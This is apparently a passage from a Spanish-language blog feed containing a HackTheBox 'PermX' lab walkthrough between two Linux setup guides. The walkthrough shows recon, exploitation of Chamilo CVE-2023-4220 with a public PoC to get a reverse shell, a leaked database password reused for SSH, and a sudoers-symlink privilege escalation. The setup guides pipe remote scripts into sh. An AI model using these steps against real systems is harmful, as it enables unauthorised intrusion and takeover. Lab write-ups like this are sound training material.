    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yay <span class="nt">-S</span> visual-studio-code-bin
</code></pre></div>    </div>
  </li>
  <li>VLC (Reproductor multimedia)
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> vlc
</code></pre></div>    </div>
  </li>
  <li>wget y curl (Herramienta de descarga):
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pacman <span class="nt">-S</span> wget curl
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="personalizaci√≥n">Personalizaci√≥n</h2>
<p>La personalizaci√≥n puede variar dependiendo de cada escritorio. En este caso, se usar√° KDE Plasma, que es un escritorio bastante personalizable.</p>

<p style="text-align: center;">
<img src="/assets/images/ArchLinux/Personalizacion.png" />
</p>

<p>Personalizaci√≥n de nano para que tenga color usaremos <a href="https://github.com/scopatz/nanorc">nanorc</a></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://raw.githubusercontent.com/scopatz/nanorc/master/install.sh | sh
</code></pre></div></div>
<p>Personalizacion de neovim usaremos <a href="https://github.com/NvChad/NvChad?tab=readme-ov-file">NvChad</a></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/NvChad/starter ~/.config/nvim <span class="o">&amp;&amp;</span> nvim
</code></pre></div></div>
<p>Para mas detalles de instalaci√≥n de herramientas para Linux podemos ver el siguiente enlace:</p>

<p><a href="https://eduardo99rp.github.io/linux/Personalizacion/">Personalizaci√≥n de un entorno de trabajo Linux</a></p>]]></content><author><name>Eduardo Rivera</name></author><category term="Linux" /><category term="Linux" /><category term="Personalizaci√≥n" /><summary type="html"><![CDATA[Nos sumergimos en la instalaci√≥n de Arch Linux, un proceso que puede parecer un gran reto al principio, pero que en realidad es muy sencillo. Adem√°s, la personalizaci√≥n del sistema abre un mundo de posibilidades, permiti√©ndote adaptar cada detalle a tus necesidades y preferencias.]]></summary></entry><entry><title type="html">M√°quina PermX de HackTheBox con dificultad f√°cil</title><link href="http://localhost:4000/hackthebox/permx/" rel="alternate" type="text/html" title="M√°quina PermX de HackTheBox con dificultad f√°cil" /><published>2024-07-12T00:00:00-06:00</published><updated>2024-07-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/permx</id><content type="html" xml:base="http://localhost:4000/hackthebox/permx/"><![CDATA[<h3 id="recocimiento">Recocimiento</h3>
<p style="text-align: justify;">
Esta m√°quina est√° clasificada como f√°cil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente l√≠nea de c√≥digo:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-oG</span> allPorts 10.10.11.23
</code></pre></div></div>
<p style="text-align: justify;">
EEl escaneo nos arroj√≥ que est√°n abiertos dos puertos, el 22 y el 80, algo muy com√∫n para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando: 
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> Ports 10.10.11.23
</code></pre></div></div>

<p>Nos arroja la siguiente informaci√≥n:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94SVN scan initiated Thu Jul 11 16:02:33 2024 as: nmap -sCV -p22,80 -oN Ports 10.10.11.23</span>
Nmap scan report <span class="k">for </span>10.10.11.23
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: Host: 127.0.0.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
</code></pre></div></div>
<p>Debemos agregar al archivo hosts la direcci√≥n y su enlace:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
</code></pre></div></div>
<p>En el archivo se agrega lo siguiente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.23     permx.htb
</code></pre></div></div>
<p>Una vez guardados los cambios, vamos a nuestro navegador y analizamos la p√°gina:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina1.png" />
</p>

<p style="text-align: justify;">
Navegando en la p√°gina, no encontramos nada en lo cual se pueda comenzar un ataque, as√≠ que ahora procedemos a usar la herramienta `ffuf` para encontrar posibles p√°ginas ocultas.
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-u</span> http://permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 138ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 140ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 226ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 205ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 160ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 125ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 129ms]
:: Progress: [20476/20476] :: Job [1/1] :: 162 req/sec :: Duration: [0:01:29] :: Errors: 0 ::

</span></code></pre></div></div>
<p style="text-align: justify;">

Con el escaneo encontramos diversas p√°ginas:

<ul>
  <li><a href="http://permx.htb/css/" target="_blank">http://permx.htb/css/</a></li>
  <li><a href="http://permx.htb/img/" target="_blank">http://permx.htb/img/</a></li>
  <li><a href="http://permx.htb/js/" target="_blank">http://permx.htb/js/</a></li>
  <li><a href="http://permx.htb/lib/" target="_blank">http://permx.htb/lib/</a></li>
</ul>


Pero hay un problema, en ninguna de estas se encontr√≥ nada interesante, as√≠ que procedemos a buscar alguna p√°gina asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesi√≥n. Para ello, vamos a usar fuzz de otra manera.

</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://permx.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.permx.htb"</span> <span class="nt">-fc</span> 302

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 510ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 270ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</span></code></pre></div></div>
<p style="text-align: justify;">

Como podemos ver, encontramos dos subdominios, los cuales son:

<ul>
  <li><a href="http://www.permx.htb/" target="_blank">http://www.permx.htb/</a></li>
  <li><a href="http://lms.permx.htb/" target="_blank">http://lms.permx.htb/</a></li>
</ul>

De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesi√≥n el cual usa Chamilo:
</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina2.png" />
</p>

<p style="text-align: justify;">
En esta p√°gina podemos encontrar un inicio de sesi√≥n. Probamos con credenciales t√≠picas como admin - admin, pero no tiene fallas de ese estilo. As√≠ como en la p√°gina anterior vimos que ten√≠a p√°ginas ocultas, procedemos a buscar si esta cuenta con p√°ginas ocultas:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-u</span> http://lms.permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt


        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lms.permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 220ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 225ms]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 164ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 176ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 290ms]
certificates            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 326ms]
documentation           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 137ms]
favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 338ms]
main                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 135ms]
plugin                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 156ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 137ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 156ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 127ms]
web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 161ms]
:: Progress: [20476/20476] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
</span></code></pre></div></div>
<p style="text-align: justify;">

De la misma manera que en la p√°gina anterior, encontramos las siguientes p√°ginas:

<ul>
    <li><a href="http://lms.permx.htb/LICENSE/" target="_blank">http://lms.permx.htb/LICENSE/</a></li>
    <li><a href="http://lms.permx.htb/app/" target="_blank">http://lms.permx.htb/app/</a></li>
    <li><a href="http://lms.permx.htb/bin/" target="_blank">http://lms.permx.htb/bin/</a></li>
    <li><a href="http://lms.permx.htb/certificates/" target="_blank">http://lms.permx.htb/certificates/</a></li>
    <li><a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a></li>
    <li><a href="http://lms.permx.htb/favicon.ico/" target="_blank">http://lms.permx.htb/favicon.ico/</a></li>
    <li><a href="http://lms.permx.htb/main/" target="_blank">http://lms.permx.htb/main/</a></li>
    <li><a href="http://lms.permx.htb/plugin/" target="_blank">http://lms.permx.htb/plugin/</a></li>
    <li><a href="http://lms.permx.htb/robots.txt/" target="_blank">http://lms.permx.htb/robots.txt/</a></li>
    <li><a href="http://lms.permx.htb/src/" target="_blank">http://lms.permx.htb/src/</a></li>
    <li><a href="http://lms.permx.htb/vendor/" target="_blank">http://lms.permx.htb/vendor/</a></li>
    <li><a href="http://lms.permx.htb/web/" target="_blank">http://lms.permx.htb/web/</a></li>
</ul>

Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar informaci√≥n, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. As√≠ que nos queda investigar si la versi√≥n de Chamilo que se utiliz√≥ en la p√°gina web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace 
        <a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a>, el cual nos muestra la siguiente informaci√≥n:
    </p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina3.png" />
</p>

<p style="text-align: justify;">
    Podemos observar que la versi√≥n utilizada es Chamilo 1.11. Despu√©s de una investigaci√≥n, hallamos que s√≠ tiene una vulnerabilidad, la cual se puede encontrar como:
</p>
<ul>
        <li><a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">CVE-2023-4220</a></li>
</ul>
<p style="text-align: justify;">
        Esta vulnerabilidad nos dice que:
</p>
<ul style="text-align: justify;">
    <li><strong>Descripci√≥n de la vulnerabilidad</strong>
        <p>La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en <code>/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecuci√≥n remota de c√≥digo a trav√©s de la carga de web shell.</p>
        </li>
    <li><strong>Descripci√≥n del riesgo</strong>
        <p>Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar informaci√≥n confidencial, instalar ransomware o pivotar a la red interna.
    </p>
    </li>
        <li><strong>Recomendaci√≥n</strong>
            <p>Se recomienda actualizar el software afectado a la √∫ltima versi√≥n, que mitiga esta vulnerabilidad.</p>
        </li>
    </ul>
<p style="text-align: justify;">
        Referencia: <a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">Chamilo LMS &lt;= 1.11.24 - Remote Code Execution</a>
    </p>

<h3 id="explotacion">Explotacion</h3>
<p style="text-align: justify;">
Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines pr√°cticos, se utiliza el siguiente exploit:
    </p>

<ul>
  <li><a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">Chamilo LMS Unauthenticated Big Upload File RCE PoC</a></li>
</ul>

<p>Clonamos el exploit y accedemos a la carpeta, luego procedemos a ejecutar el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py <span class="nt">-u</span> http://lms.permx.htb/ <span class="nt">-a</span> revshell
</code></pre></div></div>
<p>Antes de ejecutar el comando, debemos estar en otra terminal y asegurarnos de haber ejecutado el siguiente comando para escuchar en el puerto:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> <span class="o">[</span>PORT

<span class="c">#Ejemplo</span>
nc <span class="nt">-nlvp</span> 4444 
</code></pre></div></div>
<p>Si todo fue exitoso, la terminal donde ejecutamos el exploit deber√≠a finalizar de la siguiente manera:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina4.png" />
</p>

<p>Y la terminal que estamos escuchando estaria asi:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.59] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.23] 39654
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1186<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files<span class="nv">$ </span>
</code></pre></div></div>

<p>Despu√©s de investigar en la m√°quina, encontramos la siguiente informaci√≥n:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">ls
</span>add_course.conf.dist.php   course_info.conf.php  profile.conf.dist.php
add_course.conf.php        events.conf.dist.php  profile.conf.php
assetic.yml                events.conf.php       routing.yml
auth.conf.dist.php         fos                   routing_admin.yml
auth.conf.php              ivory_ckeditor.yml   routing_dev.yml
config.yml                 mail.conf.dist.php    routing_front.yml
config_dev.yml             mail.conf.php         security.yml
config_prod.yml            migrations.yml        services.yml
configuration.php          mopa                  sonata
course_info.conf.dist.php  parameters.yml.dist

www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">cat </span>configuration.php
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="c1">// Chamilo version 1.11.24</span>
<span class="c1">// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000</span>
<span class="cm">/* For licensing terms, see /license.txt */</span>
<span class="cd">/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */</span>

<span class="c1">// Database connection settings.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_port'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'main_database'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'03F6lY3uXAP2bkW8'</span><span class="p">;</span>
<span class="c1">// Enable access to database management for platform admins.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_manager_enabled'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</code></pre></div></div>
<p style="text-align: justify;">

En este caso, podemos encontrar una contrase√±a. Esta contrase√±a, en primeras instancias, es para iniciar sesi√≥n en la base de datos, pero podemos probar si esta contrase√±a funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ah√≠ podemos ver ese usuario, as√≠ que procederemos a intentar iniciar sesi√≥n por SSH.
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload<span class="nv">$ </span><span class="nb">cd</span> /home
<span class="nb">cd</span> /home
www-data@permx:/home<span class="nv">$ </span><span class="nb">ls
ls
</span>mtz
www-data@permx:/home<span class="nv">$ </span>
</code></pre></div></div>
<p>Para iniciar una conexion ssh procedemos ejecuatar el siguiente comando:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mtz@10.10.11.23
</code></pre></div></div>
<p>una vez iniciado nos pedira la contrasela la cual insertaremos la que encontramos y soprendentemente es la misma contrase√±a</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina5.png" />
</p>

<p>Como podemos ver solo tenemos acceso a un archivo el cual nos permitira elevar previlegios</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mtz on permx:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User mtz may run the following commands on permx:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /opt/acl.sh
mtz@permx:~<span class="nv">$ </span><span class="nb">cat</span> /opt/acl.sh 
<span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> user perm file"</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">user</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">perm</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
<span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>

<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">!=</span> /home/mtz/<span class="k">*</span> <span class="o">||</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>..<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Access denied."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Check if the path is a file</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Target must be a file."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>
</code></pre></div></div>

<p>Procedimiento para elevar previlegios</p>
<p align="center">
<img src="/assets/images/MaquinaPermx/pagina7.png" />
</p>

<p><strong>Explicaci√≥n</strong></p>

<p>1- Crear un enlace simb√≥lico:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /etc/sudoers symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>ln</strong>: Comando para crear enlaces.</li>
    <li><strong>-s</strong>: Indica que se crear√° un enlace simb√≥lico (o "symlink").</li>
    <li><strong>/etc/sudoers</strong>: Archivo original al que se crear√° el enlace.</li>
    <li><strong>symlink</strong>: Nombre del nuevo enlace simb√≥lico.</li>
</ul>
<p style="text-align: justify;">
    Este comando crea un enlace simb√≥lico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simb√≥licos son como atajos que apuntan a otro archivo o directorio.
</p>

<p>2- Listar archivos con detalles:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>ls</strong>: Comando para listar archivos y directorios.<br />
        <p>Este comando mostrar√° una lista de archivos en el directorio actual, incluida informaci√≥n detallada sobre cada archivo. Entre ellos, se mostrar√° el enlace simb√≥lico symlink.</p>
    </li>
    <li><strong>-l</strong>: Muestra una lista detallada de archivos con permisos, n√∫mero de enlaces, propietario, grupo, tama√±o, fecha de modificaci√≥n y nombre del archivo.</li>
</ul>

<p>3- Ejecutar un script con privilegios:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /opt/act.sh mtz rwx /home/mtz/symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
    <li><strong>/opt/act.sh</strong>: Ruta al script que se va a ejecutar.</li>
    <li><strong>mtz rwx /home/mtz/symlink</strong>: Argumentos pasados al script.</li>
</ul>
<p style="text-align: justify;">
    Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el prop√≥sito del script depender√° de su contenido.
</p>

<p>4- Editar un archivo con nano:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /home/mtz/symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>nano</strong>: Editor de texto en la l√≠nea de comandos.</li>
    <li><strong>/home/mtz/symlink</strong>: Archivo que se va a editar.</li>
</ul>
<p style="text-align: justify;">
    Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simb√≥lico que apunta a /etc/sudoers, estar√°s editando el archivo real /etc/sudoers.
</p>
<p align="center">
    <img src="/assets/images/MaquinaPermx/pagina6.png" alt="Ejemplo de imagen" />
</p>

<p>5- Cambiar a superusuario:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
</code></pre></div></div>

<ul style="text-align: justify;">
    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
    <li><strong>su</strong>: Cambia de usuario.</li>
</ul>
<p style="text-align: justify;">
    Este comando te cambia al usuario root, d√°ndote acceso completo a todo el sistema.
</p>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 80" /><category term="nmap" /><summary type="html"><![CDATA[En esta m√°quina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contrase√±a en m√∫ltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.]]></summary></entry><entry><title type="html">Personalizaci√≥n de un entorno de trabajo Linux.</title><link href="http://localhost:4000/linux/Personalizacion/" rel="alternate" type="text/html" title="Personalizaci√≥n de un entorno de trabajo Linux." /><published>2024-07-09T00:00:00-06:00</published><updated>2024-07-09T00:00:00-06:00</updated><id>http://localhost:4000/linux/Personalizacion</id><content type="html" xml:base="http://localhost:4000/linux/Personalizacion/"><![CDATA[<h1 id="personalizaci√≥n-de-la-terminal">Personalizaci√≥n de la terminal</h1>
<p>Instalaci√≥n de  <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">ZSH</a> para eso vamos a usar el siguiente comando:</p>

<ul>
  <li>Debian o Ubuntu
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>zsh
</code></pre></div>    </div>
  </li>
  <li>ArchLinux
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nt">-S</span> zsh
</code></pre></div>    </div>
    <p>Opcionalmente, se puede instalar <a href="https://ohmyz.sh/">oh-my-zsh</a></p>
  </li>
</ul>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh <span class="nt">-c</span> <span class="s2">"</span><span class="si">$(</span>curl <span class="nt">-fsSL</span> https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh<span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>

<h2 id="powerlevel10k">Powerlevel10k</h2>
<p>El tema preferido para la terminal es <a href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a></p>

<p>Gu√≠a de instalaci√≥n.</p>
<ul>
  <li>Fuentes que se deben instalar:
    <ul>
      <li><strong>MesloLGS</strong> fuentes que recomienda el autor:
        <ul>
          <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Regular.ttf">MesloLGS NF Regular.ttf</a></li>
          <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold.ttf">MesloLGS NF Bold.ttf</a></li>
          <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Italic.ttf">MesloLGS NF Italic.ttf</a></li>
          <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold%20Italic.ttf">MesloLGS NF Bold Italic.ttf</a></li>
        </ul>
      </li>
      <li><strong>Hack Nerd Fonts</strong>
        <ul>
          <li><a href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.2.1/Hack.zip">Hack Nerd Fonts</a>
            <ul>
